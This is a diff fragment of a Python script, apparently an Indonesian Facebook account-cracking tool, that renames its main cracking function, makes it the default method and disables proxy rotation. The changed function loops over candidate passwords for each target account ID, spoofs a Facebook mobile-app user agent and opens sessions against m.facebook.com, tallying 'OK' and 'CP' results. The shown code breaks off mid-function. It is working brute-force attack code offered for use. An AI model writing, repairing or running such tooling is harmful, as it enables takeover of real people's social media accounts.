@@ -1323,7 +1323,7 @@ def setting():
     elif fankylog in ["5", "05"]:
         method.append("fankymfb")
     else:
-        method.append("fankygraph")  # Default metode
+        method.append("fankymfb")  # Default metode
     # Pengaturan User-Agent
     Console().print(Panel(
         f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
@@ -1458,7 +1458,7 @@ def metslow():
                 elif "fankygraphv2" in method:
                     pool.submit(fankytouch,idf,pwv)
                 elif "fankymfb" in method:
-                    pool.submit(fankym,idf,pwv)
+                    pool.submit(fankymobile,idf,pwv)
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 else:
@@ -1531,7 +1531,7 @@ def metcepat():
                 elif "fankygraphv2" in method:
                     pool.submit(fankytouch,idf,pwv)
                 elif "fankymfb" in method:
-                    pool.submit(fankym,idf,pwv)
+                    pool.submit(fankymobile,idf,pwv)
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 else:
@@ -1817,22 +1817,21 @@ def fankytouch(idf,pwv):
 	loop+=1
 
 #-------------------[ CRACK-MAIN ]------------#
-def fankym(idf,pwv):
+def fankymobile(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	rc = random.choice
 	bo = random.choice([m,k,h,b,u,x])
-	# ua = random.choice(ugen) 
+	ua2 = random.choice(ugen) 
 	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
 	ses = requests.Session()
 	prog.update(des, description=f" {K2}•{H2} FANKY MOBILE {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-	prog.advance(des) 
+	prog.advance(des)
 	for pw in pwv:
-		pw = pw.lower()
 		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
+			# if 'ya' in ualuh: ua = ualu[0]
+			# nip=random.choice(prox)
+			# proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			p = ses.get("https://m.facebook.com")
 			b = BeautifulSoup(p.text, 'html.parser')
